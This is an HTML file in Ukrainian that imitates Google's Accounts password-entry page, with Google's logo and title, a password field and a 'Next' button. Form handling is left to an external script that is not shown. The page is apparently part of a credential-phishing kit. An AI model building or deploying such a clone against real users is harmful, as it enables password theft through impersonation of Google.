<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Введення пароля - Google Accounts</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <div class="google-logo-container">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="google-logo">
            </div>
            <h1>Вітаємо!</h1>
            <div class="account-info">
                <!-- Виведення email користувача -->
                <div id="userEmail" class="account-email"></div>
            </div>
            <form id="passwordForm">
                <div class="input-container">
                    <input type="password" id="password" name="password" placeholder="Введіть пароль" required>
                </div>
                <div class="show-password-container">
                    <input type="checkbox" id="showPassword">
                    <label for="showPassword">Показати пароль</label>
                </div>
                <button type="submit" class="login-button">Далі</button>
                <a href="#" class="forgot-password">Забули пароль?</a>
            </form>
        </div>
    </div>
    <footer>
        <div class="footer-links">
            <a href="#">Довідка</a>
            <a href="#">Конфіденційність</a>
            <a href="#">Умови</a>
        </div>
        <div class="language-select">
            <span>Українська</span>
        </div>
    </footer>
    
    <!-- Підключаємо зовнішній файл зі скриптом -->
    <script src="password_script.js"></script>
</body>
</html>
